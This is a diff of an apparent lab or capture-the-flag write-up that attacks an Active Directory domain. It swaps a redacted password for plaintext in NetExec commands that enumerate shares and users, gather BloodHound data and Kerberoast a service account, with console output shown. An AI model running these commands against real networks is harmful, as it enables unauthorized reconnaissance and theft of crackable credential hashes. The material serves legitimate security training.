@@ -103,12 +103,12 @@ SMB         10.0.23.214     445    DC01    [-] Error enumerating shares: STATUS_
 Switching to our assumed-breach credential, we enumerate shares and domain users:
 
 ```bash
-nxc smb hacksmarter.local -u "faraday" -p "<PASSWORD REDACTED>" --shares
+nxc smb hacksmarter.local -u "faraday" -p "hacksmarter123" --shares
 ```
 
 ```
 # Console Output
-SMB         10.0.23.214     445    DC01    [+] hacksmarter.local\faraday:<PASSWORD REDACTED>
+SMB         10.0.23.214     445    DC01    [+] hacksmarter.local\faraday:hacksmarter123
 SMB         10.0.23.214     445    DC01    Share           Permissions     Remark
 SMB         10.0.23.214     445    DC01    -----           -----------     ------
 SMB         10.0.23.214     445    DC01    ADMIN$                          Remote Admin
@@ -121,7 +121,7 @@ SMB         10.0.23.214     445    DC01    SYSVOL          READ            Logon
 READ on `IPC$`, `NETLOGON`, and `SYSVOL` is standard for any authenticated domain user — no non-default shares, nothing immediately actionable.
 
 ```bash
-nxc smb hacksmarter.local -u "faraday" -p "<PASSWORD REDACTED>" --users
+nxc smb hacksmarter.local -u "faraday" -p "hacksmarter123" --users
 ```
 
 ```
@@ -151,7 +151,7 @@ Fifteen domain accounts. The `.svc` suffix on `alt.svc`, `Soulkiller.svc`, `kei.
 We collect all AD objects into BloodHound for attack path analysis:
 
 ```bash
-nxc ldap dc01.hacksmarter.local -u faraday -p '<PASSWORD REDACTED>' --bloodhound -c All --dns-server 10.0.23.214
+nxc ldap dc01.hacksmarter.local -u faraday -p 'hacksmarter123' --bloodhound -c All --dns-server 10.0.23.214
 ```
 
 The ingestor authenticates over LDAP and collects users, groups, GPOs, OUs, trusts, ACLs, and session data into JSON files consumable by BloodHound CE.
@@ -167,7 +167,7 @@ BloodHound flags `alt.svc` as Kerberoastable — it has a Service Principal Name
 ![BloodHound — alt.svc flagged as Kerberoastable](../.gitbook/assets/arasaka_bloodhound_altsvc_kerberoastable.png)
 
 ```bash
-nxc ldap dc01.hacksmarter.local -u faraday -p '<PASSWORD REDACTED>' --kerberoasting hash.txt
+nxc ldap dc01.hacksmarter.local -u faraday -p 'hacksmarter123' --kerberoasting hash.txt
 ```
 
 ```
